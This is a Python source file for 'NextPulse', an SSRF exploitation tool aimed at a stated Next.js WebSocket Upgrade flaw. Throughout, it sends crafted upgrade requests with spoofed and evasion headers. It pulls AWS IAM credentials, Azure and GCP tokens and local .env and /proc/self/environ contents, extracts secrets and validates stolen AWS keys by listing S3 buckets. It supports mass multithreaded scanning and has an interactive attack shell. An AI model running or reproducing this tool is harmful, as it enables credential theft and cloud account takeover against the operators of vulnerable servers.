#!/usr/bin/env python3
"""
NextPulse - SSRF framework for CVE-2026-44578.

The Next.js WebSocket Upgrade handler reaches server-side fetches. A crafted
upgrade request can drive the server to an internal address. NextPulse
fingerprints the target, confirms the vulnerable upgrade path, walks cloud
metadata and local environment exposure, and validates any credential it
recovers.

Affected: Next.js 13.4.13 to 15.5.15, and 16.0.0 to 16.2.4.
Fixed: 15.5.16, and 16.2.5 for self-hosted.
"""

from __future__ import annotations

import argparse
import json
import os
import random
import re
import signal
import socket
import ssl
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
from datetime import datetime
from queue import Empty, Queue

VERSION = "3.6.0"

# --- palette ---------------------------------------------------------------

C_RST = "\033[0m"
C_BLD = "\033[1m"
C_DIM = "\033[2m"
C_CYAN = "\033[38;5;51m"
C_BLUE = "\033[38;5;45m"
C_ICE = "\033[38;5;117m"
C_WHITE = "\033[38;5;255m"
C_RED = "\033[38;5;196m"
C_PINK = "\033[38;5;198m"
C_AMBER = "\033[38;5;220m"
C_GRN = "\033[38;5;82m"
C_PANEL = "\033[38;5;39m"
C_MUTED = "\033[38;5;240m"

_COLOR_NAMES = ["C_RST", "C_BLD", "C_DIM", "C_CYAN", "C_BLUE", "C_ICE", "C_WHITE",
                "C_RED", "C_PINK", "C_AMBER", "C_GRN", "C_PANEL", "C_MUTED"]


def disable_color() -> None:
    global _COLOR, _QUIET
    for name in _COLOR_NAMES:
        globals()[name] = ""


_COLOR = True
_QUIET = False
USER_AGENT = ""

# --- constants -------------------------------------------------------------

WS_KEY = "dGhlIHNhbXBsZSBub25jZQ=="

USER_AGENTS = [
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
]

CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE

_lock = threading.Lock()
_results: list = []
_exit = 0

VULN_RANGES = [((13, 4, 13), (15, 5, 15)), ((16, 0, 0), (16, 2, 4))]

# Cloud metadata endpoints, used to detect which provider sits behind the target.
CLOUD_PROBES = {
    "aws": [("http://169.254.169.254/latest/meta-data/", ["ami-id", "instance-id", "hostname", "iam/", "block-device-mapping"])],
    "azure": [("http://169.254.169.254/metadata/instance?api-version=2021-02-01", ["azEnvironment", "subscriptionId", "vmId"])],
    "gcp": [("http://metadata.google.internal/computeMetadata/v1/", ["instance/", "project/"])],
    "do": [("http://169.254.169.254/metadata/v1.json", ["droplet_id", "hostname", "interfaces"])],
    "oracle": [("http://169.254.169.254/opc/v1/instance/", ["compartmentId", "displayName"])],
    "alibaba": [("http://100.100.100.200/latest/meta-data/", ["instance-id", "image-id", "zone-id"])],
    "kubernetes": [("http://kubernetes.default.svc/api/v1/", ["namespaces", "pods", "services"])],
}

# Targets scanned per provider when a scan runs.
CLOUD_TARGETS = {
    "aws": [
        ("AWS metadata base", "http://169.254.169.254/latest/meta-data/"),
        ("AWS hostname", "http://169.254.169.254/latest/meta-data/hostname"),
        ("AWS credentials directory", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
        ("AWS user data", "http://169.254.169.254/latest/user-data"),
        ("AWS instance id", "http://169.254.169.254/latest/meta-data/instance-id"),
        ("AWS ami id", "http://169.254.169.254/latest/meta-data/ami-id"),
        ("AWS identity info", "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/info"),
    ],
    "azure": [
        ("Azure instance metadata", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
        ("Azure managed identity token", "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"),
    ],
    "gcp": [
        ("GCP project id", "http://metadata.google.internal/computeMetadata/v1/project/project-id"),
        ("GCP service account token", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"),
    ],
    "do": [
        ("DigitalOcean metadata", "http://169.254.169.254/metadata/v1.json"),
    ],
    "oracle": [
        ("Oracle OCI instance", "http://169.254.169.254/opc/v1/instance/"),
    ],
    "alibaba": [
        ("Alibaba metadata", "http://100.100.100.200/latest/meta-data/"),
    ],
    "kubernetes": [
        ("Kubernetes API", "http://kubernetes.default.svc/api/v1/"),
    ],
    "leex": [
        ("Local env file", "http://127.0.0.1/.env"),
        ("Local process env", "http://127.0.0.1/proc/self/environ"),
        ("Node package file", "http://127.0.0.1/package.json"),
        ("Production config", "http://127.0.0.1/config/production.json"),
        ("Local passwd file", "http://127.0.0.1/etc/passwd"),
    ],
}

SECRET_RE = re.compile(r"(?:password|secret|key|token|auth|credential|api_key|db_)[=:]\s*[\"'\w\-./+]+", re.I)
AWS_KEY_RE = re.compile(r"AKIA[0-9A-Z]{16}")

# --- output ----------------------------------------------------------------


def info(msg: str) -> None:
    if not _QUIET:
        print(f"{C_BLUE}[INFO]{C_RST} {msg}")


def warn(msg: str) -> None:
    if not _QUIET:
        print(f"{C_AMBER}[WARN]{C_RST} {msg}")


def err(msg: str) -> None:
    print(f"{C_RED}[FAIL]{C_RST} {msg}", file=sys.stderr)


def step(msg: str) -> None:
    if not _QUIET:
        print(f"{C_CYAN}[STEP]{C_RST} {C_BLD}{msg}{C_RST}")


def dim(msg: str) -> None:
    if not _QUIET:
        print(f"{C_MUTED}{msg}{C_RST}")


def hit(msg: str) -> None:
    line = "=" * 78
    print(f"\n{C_PINK}{C_BLD}{line}\n {msg}\n{line}{C_RST}\n")


def banner() -> None:
    line = "=" * 78
    print(f"{C_CYAN}{line}{C_RST}")
    print(f"{C_PINK}{C_BLD}NextPulse :: Next.js SSRF framework (CVE-2026-44578){C_RST}")
    print(f"{C_CYAN}{line}{C_RST}")
    print(f"{C_WHITE}Vector   {C_RST}: WebSocket Upgrade handler SSRF")
    print(f"{C_WHITE}Modules  {C_RST}: cloud metadata, middleware, internal fetch")
    print(f"{C_WHITE}Build    {C_RST}: v{VERSION}")
    print(f"{C_WHITE}Author   {C_RST}: @DeathShotXD")
    print(f"{C_CYAN}{line}{C_RST}\n")


# --- transport -------------------------------------------------------------


def get_ua() -> str:
    return USER_AGENT or random.choice(USER_AGENTS)


def generate_evasion_headers() -> str:
    base = [
        "Connection: Upgrade",
        "Upgrade: websocket",
        "Sec-WebSocket-Version: 13",
        f"Sec-WebSocket-Key: {WS_KEY}",
    ]
    random.shuffle(base)
    return "\r\n".join(base)


def ssrf(host: str, port: int, use_ssl: bool, path: str, timeout: float = 10,
         retries: int = 0) -> tuple[int, str]:
    """Send the upgrade request over a raw socket. Returns (code, body).

    A transport failure returns (0, "") so callers never mistake an error
    string for response content.
    """
    last = None
    for attempt in range(retries + 1):
        raw = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"{generate_evasion_headers()}\r\n"
            f"User-Agent: {get_ua()}\r\n"
            f"X-Forwarded-For: 127.0.0.1\r\n"
            f"X-Real-IP: 127.0.0.1\r\n"
            f"X-Client-IP: 127.0.0.1\r\n\r\n"
        ).encode()
        try:
            conn = socket.create_connection((host, port), timeout=timeout)
            conn.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            if use_ssl:
                conn = CTX.wrap_socket(conn, server_hostname=host)
            conn.sendall(raw)
            conn.settimeout(timeout)
            buf = b""
            try:
                while len(buf) < 524288:
                    chunk = conn.recv(32768)
                    if not chunk:
                        break
                    buf += chunk
            except socket.timeout:
                pass
            conn.close()
            resp = buf.decode(errors="replace")
            match = re.match(r"HTTP/[\d.]+ (\d+)", resp)
            code = int(match.group(1)) if match else 0
            body = resp.split("\r\n\r\n", 1)[1] if "\r\n\r\n" in resp else resp
            return code, body
        except Exception as exc:
            last = exc
            if attempt < retries:
                time.sleep(0.2 * (attempt + 1))
    warn(f"request to {path} failed: {type(last).__name__}" if last else f"request to {path} failed")
    return 0, ""


def fetch(url: str, timeout: float = 8, retries: int = 1):
    """Plain HTTP GET with retries. Returns (code, body, headers)."""
    last = None
    for attempt in range(retries + 1):
        try:
            req = urllib.request.Request(url, headers={"User-Agent": get_ua(), "Accept": "*/*"})
            with urllib.request.urlopen(req, timeout=timeout, context=CTX) as resp:
                return resp.status, resp.read(65536).decode(errors="replace"), dict(resp.headers)
        except urllib.error.HTTPError as exc:
            return exc.code, (exc.read(65536).decode(errors="replace") if exc.fp else ""), dict(exc.headers or {})
        except Exception as exc:
            last = exc
            if attempt < retries:
                time.sleep(0.2 * (attempt + 1))
    return 0, "", {}


# --- fingerprinting --------------------------------------------------------


def parse_target(url: str):
    parsed = urllib.parse.urlparse(url)
    hostname = parsed.hostname
    if not hostname and parsed.path:
        hostname = parsed.path.split("/")[0]
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    return hostname, port, parsed.scheme == "https"


def is_nextjs(body: str) -> bool:
    return any(token in body for token in ["/_next/static", "/_next/chunks", 'charSet="utf-8"', "__NEXT_DATA__"])


def parse_ver(text: str):
    match = re.search(r"(\d+)\.(\d+)\.(\d+)", text or "")
    return tuple(int(x) for x in match.groups()) if match else None


def is_vulnerable(ver):
    if not ver:
        return None
    return any(lo <= ver <= hi for lo, hi in VULN_RANGES)


def analyze_headers(headers_dict: dict) -> dict:
    server = (headers_dict.get("Server", "") + headers_dict.get("server", "")).lower()
    via = (headers_dict.get("Via", "") + headers_dict.get("via", "")).lower()
    powered = (headers_dict.get("X-Powered-By", "") + headers_dict.get("x-powered-by", "")).lower()
    proxies = []
    if "nginx" in server or "nginx" in via:
        proxies.append("Nginx")
    if "cloudflare" in server:
        proxies.append("Cloudflare")
    if "cloudfront" in via:
        proxies.append("AWS CloudFront")
    if "akamai" in server:
        proxies.append("Akamai")
    return {"proxies": proxies, "powered_by": powered, "server_header": server}


def detect_nextjs(base: str, timeout: float = 8) -> dict:
    result = {"nextjs": False, "version": None, "version_str": None,
              "vulnerable": None, "proxy_blocked": False, "fingerprint": {}}
    for path in ["/_next/static/", "/", "/api/health", "/_next/webpack-hmr", "/_next/data/"]:
        code, body, headers = fetch(base + path, timeout=timeout)
        if code == 0:
            continue
        fprint = analyze_headers(headers)
        result["fingerprint"] = fprint
        if "Nginx" in fprint["proxies"]:
            result["proxy_blocked"] = True
        marker = (fprint["powered_by"] + fprint["server_header"]).lower()
        if "next" in marker or path == "/_next/static/":
            result["nextjs"] = True
        match = re.search(r'["\']?next["\']?\s*:\s*["\'](\d+\.\d+\.\d+)["\']', body) or \
            re.search(r"Next\.js[/ ]v?(\d+\.\d+\.\d+)", body)
        if match:
            ver = parse_ver(match.group(1))
            result.update(version=ver, version_str=match.group(1), nextjs=True, vulnerable=is_vulnerable(ver))
            break
    return result


# --- extraction ------------------------------------------------------------


def render(body: str, max_lines: int = 30) -> str:
    try:
        obj = json.loads(body)
        out = []
        for line in json.dumps(obj, indent=2).splitlines()[:max_lines]:
            key = line.split('":')[0].strip().strip('"').lower()
            sensitive = any(s in key for s in ["key", "secret", "token", "password", "access", "cred", "auth", "private"])
            color = C_CYAN + C_BLD if sensitive else ""
            out.append(f"   {color}{line}{C_RST if color else ''}")
        return "\n".join(out)
    except Exception:
        return "\n".join(f"   {line}" for line in body.strip().splitlines()[:max_lines])


def extract_secrets(body: str) -> list:
    return SECRET_RE.findall(body or "")


def detect_cloud(host: str, port: int, use_ssl: bool, timeout: float = 8) -> dict:
    step("Detecting the cloud provider")
    found = {}
    for provider, probes in CLOUD_PROBES.items():
        for url, hints in probes:
            code, body = ssrf(host, port, use_ssl, url, timeout)
            if code == 200 and not is_nextjs(body):
                hits = [h for h in hints if h.lower() in body.lower()]
                if hits:
                    found[provider] = {"url": url, "hints": hits}
                    info(f"Cloud provider identified: {C_AMBER}{C_BLD}{provider.upper()}{C_RST} ({', '.join(hits)})")
                    break
            time.sleep(random.uniform(0.01, 0.03))
    if not found:
        dim("No cloud metadata footprint")
    return found


def validate_aws_creds(ak: str, sk: str, token: str = "", region: str = "us-east-1"):
    step("Validating the recovered AWS credentials")
    try:
        import boto3
    except ImportError:
        warn("boto3 is not installed; skipping validation")
        return None
    try:
        session = boto3.Session(aws_access_key_id=ak, aws_secret_access_key=sk,
                                aws_session_token=token or None, region_name=region)
        identity = session.client("sts").get_caller_identity()
        info(f"Credentials VALID | account {C_WHITE}{identity.get('Account')}{C_RST} | arn {C_CYAN}{identity.get('Arn')}{C_RST}")
        try:
            buckets = session.client("s3").list_buckets().get("Buckets", [])
            if buckets:
                hit(f"AWS RECON - {len(buckets)} S3 buckets reachable")
                for bucket in buckets[:5]:
                    dim(f"   * {bucket['Name']}")
        except Exception:
            dim("S3 listing denied for this principal")
        return identity
    except Exception as exc:
        warn(f"credential validation failed: {exc}")
        return None


def validate_azure_token(token: str) -> dict:
    step("Validating the recovered Azure token")
    result = {}
    code, body, _ = fetch("https://management.azure.com/subscriptions?api-version=2020-01-01", timeout=8)
    try:
        return json.loads(body)
    except Exception:
        return result


def exploit_aws(host: str, port: int, use_ssl: bool, timeout: float = 8) -> dict:
    results = {}
    print(f"\n{C_CYAN}[1/3]{C_RST} Instance metadata")
    for name, url in [
        ("instance-id", "http://169.254.169.254/latest/meta-data/instance-id"),
        ("instance-type", "http://169.254.169.254/latest/meta-data/instance-type"),
        ("hostname", "http://169.254.169.254/latest/meta-data/hostname"),
        ("local-ipv4", "http://169.254.169.254/latest/meta-data/local-ipv4"),
        ("public-ipv4", "http://169.254.169.254/latest/meta-data/public-ipv4"),
        ("ami-id", "http://169.254.169.254/latest/meta-data/ami-id"),
        ("region", "http://169.254.169.254/latest/meta-data/placement/region"),
        ("availability-zone", "http://169.254.169.254/latest/meta-data/placement/availability-zone"),
    ]:
        code, body = ssrf(host, port, use_ssl, url, timeout)
        value = body.strip()[:160] if (code == 200 and not is_nextjs(body)) else None
        print(f"   [{code}] {C_ICE}{name:<18}{C_RST} : {value or 'no response'}")
        if value:
            results[name] = value
        time.sleep(random.uniform(0.01, 0.02))

    print(f"\n{C_CYAN}[2/3]{C_RST} IAM role")
    role = None
    code, body = ssrf(host, port, use_ssl, "http://169.254.169.254/latest/meta-data/iam/security-credentials/", timeout)
    if code == 200 and not is_nextjs(body) and body.strip():
        role = body.strip().splitlines()[0].strip()
        info(f"role scope: {C_CYAN}{C_BLD}{role}{C_RST}")
        results["iam_role"] = role
    else:
        code, body = ssrf(host, port, use_ssl, "http://169.254.169.254/latest/meta-data/iam/info", timeout)
        if code == 200 and not is_nextjs(body):
            try:
                arn = json.loads(body).get("InstanceProfileArn", "")
                if arn:
                    role = arn.split("/")[-1]
                    info(f"role scope from instance profile: {C_CYAN}{C_BLD}{role}{C_RST}")
                    results["iam_role"] = role
            except Exception:
                pass
        if not role:
            dim("no IAM role exposed")

    print(f"\n{C_CYAN}[3/3]{C_RST} Credentials")
    if role:
        code, body = ssrf(host, port, use_ssl,
                          f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role}", timeout)
        if code == 200 and not is_nextjs(body):
            try:
                creds = json.loads(body)
                ak, sk = creds.get("AccessKeyId", ""), creds.get("SecretAccessKey", "")
                token = creds.get("Token", "")
                if ak and sk:
                    hit("AWS CREDENTIALS RECOVERED")
                    for label, value in [("role", role), ("access key", ak),
                                         ("secret key", sk), ("token", token),
                                         ("expiration", creds.get("Expiration", ""))]:
                        print(f"   {C_ICE}{label:<12}{C_RST} : {C_GRN}{C_BLD}{value}{C_RST}")
                    results["credentials"] = creds
                    results["verify_cmd"] = (f"AWS_ACCESS_KEY_ID={ak} AWS_SECRET_ACCESS_KEY={sk} "
                                             f"AWS_SESSION_TOKEN={token} aws sts get-caller-identity")
                    print(f"\n   {C_AMBER}verify:{C_RST} {C_MUTED}{results['verify_cmd']}{C_RST}\n")
                    validate_aws_creds(ak, sk, token)
                else:
                    print(render(body, 12))
            except Exception:
                print(body[:500])

    code, body = ssrf(host, port, use_ssl, "http://169.254.169.254/latest/user-data", timeout)
    if code == 200 and not is_nextjs(body) and body.strip():
        secrets = extract_secrets(body)
        if secrets:
            hit("SECRETS IN USER DATA")
            for secret in secrets[:5]:
                dim(f"   * {secret}")
        else:
            dim(f"user data captured ({len(body)} bytes)")
        results["user_data"] = body[:1000]
    return results


def exploit_azure(host: str, port: int, use_ssl: bool, timeout: float = 8) -> dict:
    results = {}
    code, body = ssrf(host, port, use_ssl, "http://169.254.169.254/metadata/instance?api-version=2021-02-01", timeout)
    if code == 200 and not is_nextjs(body):
        try:
            compute = json.loads(body).get("compute", {})
            info("Azure instance metadata")
            for key in ["vmId", "name", "resourceGroupName", "subscriptionId", "location", "vmSize"]:
                value = compute.get(key, "")
                if value:
                    print(f"   {C_WHITE}{key:<20}{C_RST} : {value}")
                    results[key] = value
        except Exception:
            print(body[:400])

    code, body = ssrf(host, port, use_ssl,
                      "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
                      timeout)
    if code == 200 and not is_nextjs(body):
        try:
            token = json.loads(body).get("access_token", "")
            if token:
                hit("AZURE MANAGED IDENTITY TOKEN RECOVERED")
                print(f"   {C_ICE}token{C_RST} : {C_GRN}{C_BLD}{token[:120]}...{C_RST}")
                results["azure_token"] = token
                validate_azure_token(token)
        except Exception:
            pass
    return results


# --- interactive shell -----------------------------------------------------


IMDS_PRESETS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/ami-id",
    "http://169.254.169.254/latest/meta-data/hostname",
    "http://169.254.169.254/latest/meta-data/instance-type",
    "http://169.254.169.254/latest/meta-data/iam/info",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/user-data",
    "http://100.100.100.200/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    "http://kubernetes.default.svc/api/v1/",
    "http://127.0.0.1/.env",
]


def interactive(target_url: str, timeout: float = 10) -> None:
    host, port, use_ssl = parse_target(target_url)
    session = {"target": target_url, "results": {}, "history": [],
               "telemetry": {"requests": 0, "bytes": 0}}
    print(f"\n{C_PANEL}NextPulse shell{C_RST} - connected to {C_CYAN}{host}:{port}{C_RST} "
          f"({'tls' if use_ssl else 'tcp'})\n")

    def dispatch(url: str):
        dim(f"-> {url}")
        session["telemetry"]["requests"] += 1
        code, body = ssrf(host, port, use_ssl, url, timeout)
        session["telemetry"]["bytes"] += len(body)
        proxied = is_nextjs(body)
        print(f"   [{code}] {len(body)} bytes" + (" (framework layout, dropped)" if proxied else ""))
        if not proxied and body.strip():
            print(render(body))
            if "127.0.0.1" in url or "localhost" in url:
                secrets = extract_secrets(body)
                if secrets:
                    hit("LOCAL SECRETS")
                    for secret in secrets[:5]:
                        dim(f"   * {secret}")
        session["history"].append({"url": url, "code": code, "timestamp": time.time()})
        return code, body

    while True:
        try:
            command = input(f"{C_CYAN}nextpulse{C_MUTED}::{C_WHITE}core{C_RST} "
                            f"({C_ICE}{host[:20]}{C_RST}) {C_PINK}> {C_RST}").strip()
        except (EOFError, KeyboardInterrupt):
            break
        if not command:
            continue
        if command in ("q", "quit", "exit"):
            break
        if command == "help":
            print("   cloud / scan / aws / azure / url <url> / get <N> / list / history / telemetry / save / quit")
        elif command == "cloud":
            detect_cloud(host, port, use_ssl, timeout)
        elif command == "aws":
            exploit_aws(host, port, use_ssl, timeout)
        elif command == "azure":
            exploit_azure(host, port, use_ssl, timeout)
        elif command == "scan":
            clouds = detect_cloud(host, port, use_ssl, timeout)
            if "aws" in clouds:
                exploit_aws(host, port, use_ssl, timeout)
            elif "azure" in clouds:
                exploit_azure(host, port, use_ssl, timeout)
            else:
                for url in ["http://127.0.0.1/.env", "http://127.0.0.1/proc/self/environ",
                            "http://kubernetes.default.svc/api/v1/"]:
                    dispatch(url)
        elif command.startswith("url "):
            url = command[4:].strip()
            if url.startswith("http://"):
                dispatch(url)
            else:
                warn("only http:// is reachable through the upgrade path on port 80")
        elif command.startswith("get "):
            try:
                dispatch(IMDS_PRESETS[int(command.split()[1])])
            except (ValueError, IndexError):
                warn("invalid preset index")
        elif command == "list":
            for index, url in enumerate(IMDS_PRESETS):
                print(f"   [{index}] {url}")
        elif command == "history":
            for entry in session["history"][-15:]:
                print(f"   [{entry['code']}] {entry['url']}")
        elif command == "telemetry":
            print(f"   requests : {session['telemetry']['requests']}")
            print(f"   bytes    : {session['telemetry']['bytes']}")
        elif command == "save":
            stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            name = f"nextpulse_{host}_{stamp}.json"
            with open(name, "w") as handle:
                json.dump(session, handle, indent=2, default=str)
            info(f"session saved: {name}")
        elif command.startswith("http://"):
            dispatch(command)


# --- scan ------------------------------------------------------------------


def scan(target: str, args) -> dict:
    global _exit
    if not target.startswith("http"):
        target = "https://" + target

    det = detect_nextjs(target, args.timeout)
    version = det.get("version_str") or "unknown"
    vulnerable = det.get("vulnerable")

    if not det["nextjs"]:
        dim(f"not Next.js: {target}")
        return {}

    if det.get("proxy_blocked"):
        warn("nginx proxy in front of the target")

    label = {True: "VULNERABLE", False: "patched", None: "version unknown"}[vulnerable]
    color = {True: C_RED, False: C_GRN, None: C_AMBER}[vulnerable]
    info(f"{C_WHITE}{target}{C_RST} - Next.js/{version} - {color}{C_BLD}{label}{C_RST}")

    if vulnerable is False and not args.force:
        return {"target": target, "version": version, "vulnerable": False,
                "ssrf_hits": [], "scan_epoch": time.time()}

    host, port, use_ssl = parse_target(target)
    result = {"target": target, "version": version, "vulnerable": vulnerable,
              "ssrf_hits": [], "scan_epoch": time.time()}

    if args.ssrf:
        targets_list = [("Custom", args.ssrf)]
    elif args.cloud == "all":
        targets_list = [item for group in CLOUD_TARGETS.values() for item in group]
    else:
        targets_list = CLOUD_TARGETS.get(args.cloud, CLOUD_TARGETS["aws"])

    step(f"testing {len(targets_list)} targets")
    for desc, url in targets_list:
        dim(f"   -> {url}")
        code, body = ssrf(host, port, use_ssl, url, args.timeout, retries=args.retries)
        time.sleep(random.uniform(0.01, 0.02))

        proxied = is_nextjs(body)
        is_hit = False
        evidence = ""

        if "Failed to proxy http:/" in body or (code == 200 and not proxied):
            is_hit = True
            evidence = body[:1000]
            if "127.0.0.1" in url or "localhost" in url:
                secrets = extract_secrets(body)
                if secrets:
                    hit("LOCAL SECRETS")
                    for secret in secrets[:5]:
                        dim(f"   * {secret}")

        if AWS_KEY_RE.search(body) or ('"AccessKeyId"' in body and '"SecretAccessKey"' in body):
            is_hit = True
            evidence = body[:1200]
            hit(f"AWS CREDENTIALS via {url}")

        if is_hit:
            hit(f"SSRF CONFIRMED - {desc}")
            print(f"   url    : {url}")
            print(f"   status : HTTP {code}")
            if evidence:
                print(render(evidence, 20))
            result["ssrf_hits"].append({"desc": desc, "url": url, "status": code,
                                        "timestamp": time.time()})
            with _lock:
                _exit = max(_exit, 2)

    if not result["ssrf_hits"] and vulnerable:
        with _lock:
            _exit = max(_exit, 1)
    return result


def worker(queue: Queue, args) -> None:
    while True:
        try:
            target = queue.get(timeout=1)
        except Empty:
            break
        try:
            result = scan(target, args)
            if result:
                with _lock:
                    _results.append(result)
        except Exception as exc:
            err(f"{target}: {exc}")
        finally:
            queue.task_done()


def summary(results: list) -> None:
    vulnerable = [r for r in results if r.get("vulnerable")]
    hits = [r for r in results if r.get("ssrf_hits")]
    line = "=" * 60
    print(f"\n{line}")
    print(" NextPulse summary")
    print(line)
    print(f"   targets scanned : {len(results)}")
    print(f"   vulnerable      : {len(vulnerable)}")
    print(f"   ssrf confirmed  : {len(hits)}")
    if hits:
        print("")
        for result in hits[:5]:
            print(f"   * {result['target']}")
    print(line)


def save_results(path: str) -> None:
    with open(path, "w") as handle:
        if path.endswith(".json"):
            json.dump(_results, handle, indent=2, default=str)
        else:
            for result in _results:
                handle.write(json.dumps(result, default=str) + "\n")
    info(f"results saved: {path}")


# --- cli -------------------------------------------------------------------


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="nextpulse",
        description="NextPulse - SSRF framework for CVE-2026-44578 (Next.js WebSocket Upgrade).")
    parser.add_argument("-t", "--target", help="target URL")
    parser.add_argument("--pipe", action="store_true", help="read targets from standard input")
    parser.add_argument("-f", "--file", help="file of targets, one per line")
    parser.add_argument("--threads", type=int, default=20, help="scan threads (default 20)")
    parser.add_argument("--timeout", type=float, default=10, help="request timeout (default 10)")
    parser.add_argument("--retries", type=int, default=1, help="retries per request (default 1)")
    parser.add_argument("--cloud", choices=["aws", "azure", "gcp", "do", "oracle", "alibaba",
                                            "kubernetes", "leex", "all"], default="aws")
    parser.add_argument("--ssrf", help="custom SSRF target")
    parser.add_argument("--force", action="store_true", help="scan even when the version looks patched")
    parser.add_argument("-i", "--interactive", action="store_true", help="interactive shell")
    parser.add_argument("--auto", action="store_true", help="detect and exploit automatically")
    parser.add_argument("-o", "--output", help="results file (.json or .jsonl)")
    parser.add_argument("--user-agent", help="custom user agent")
    parser.add_argument("--no-banner", action="store_true", help="suppress the banner")
    parser.add_argument("--no-color", action="store_true", help="disable colored output")
    parser.add_argument("--quiet", action="store_true", help="suppress informational output")
    parser.add_argument("--version", action="version", version=f"NextPulse {VERSION}")
    return parser


def main(argv=None) -> int:
    global _QUIET, USER_AGENT
    args = build_parser().parse_args(argv)

    if args.no_color or os.environ.get("NO_COLOR"):
        disable_color()
    if args.quiet:
        _QUIET = True
    if args.user_agent:
        USER_AGENT = args.user_agent

    if not args.no_banner and not _QUIET:
        banner()

    def on_signal(signum, frame):
        warn("interrupted")
        summary(_results)
        if args.output:
            save_results(args.output)
        sys.exit(_exit)

    signal.signal(signal.SIGINT, on_signal)

    targets = []
    if args.target:
        targets.append(args.target)
    if args.pipe:
        targets.extend(line.strip() for line in sys.stdin if line.strip())
    if args.file:
        with open(args.file) as handle:
            targets.extend(line.strip() for line in handle if line.strip() and not line.startswith("#"))
    targets = [t if t.startswith("http") else "https://" + t for t in targets]

    if not targets:
        err("no targets given")
        return 1

    if args.interactive or args.auto:
        if len(targets) != 1:
            err("interactive and auto modes take a single target")
            return 1
        host, port, use_ssl = parse_target(targets[0])
        if args.auto:
            clouds = detect_cloud(host, port, use_ssl, args.timeout)
            if "aws" in clouds:
                exploit_aws(host, port, use_ssl, args.timeout)
            elif "azure" in clouds:
                exploit_azure(host, port, use_ssl, args.timeout)
            else:
                for url in ["http://127.0.0.1/.env", "http://127.0.0.1/proc/self/environ",
                            "http://kubernetes.default.svc/api/v1/"]:
                    ssrf(host, port, use_ssl, url, args.timeout)
        else:
            interactive(targets[0], args.timeout)
        return _exit

    if len(targets) == 1:
        result = scan(targets[0], args)
        if result:
            _results.append(result)
    else:
        step(f"scanning {len(targets)} targets with {args.threads} threads")
        queue: Queue = Queue()
        for target in targets:
            queue.put(target)
        threads = [threading.Thread(target=worker, args=(queue, args), daemon=True)
                   for _ in range(min(args.threads, len(targets)))]
        for thread in threads:
            thread.start()
        try:
            queue.join()
        except KeyboardInterrupt:
            on_signal(None, None)

    summary(_results)
    if args.output:
        save_results(args.output)
    return _exit


if __name__ == "__main__":
    sys.exit(main())
